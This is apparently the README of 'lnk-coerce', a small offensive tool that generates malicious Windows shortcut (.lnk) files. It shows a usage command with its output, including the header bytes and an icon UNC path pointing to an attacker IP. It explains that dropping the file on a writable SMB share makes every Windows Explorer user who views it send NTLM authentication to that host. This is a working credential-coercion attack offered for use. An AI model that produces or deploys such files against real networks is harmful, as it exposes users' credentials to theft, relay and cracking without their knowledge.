# lnk-coerce
Simple tool to create .lnk files that coerce NTLM authentication

# Usage

Basic Example:
```shell
gen_lnk_coerce.py -i 192.168.115.1 --verbose
[+] Wrote ~document.lnk (138 bytes)
[+] Icon UNC path: \\192.168.115.1\share\icon.ico
[*] Header bytes: 4c0000000114020000000000c000000000000046c000000020000000000000000000000000000000000000000000000000000000000000000000000001000000000000000000000000000000
[*] StringData:   1e005c005c003100390032002e003100360038002e003100310035002e0031005c00730068006100720065005c00690063006f006e002e00690063006f00
```

A common use of this is to go and place `~document.lnk` on a writeable SMB share. Anyone who accesses this share in Windows Explorer will try to render the icon located at the UNC path specified which will coerce NTLM authentication in the context of their user account.

## TODO
- See if they have decent NTFS metadata
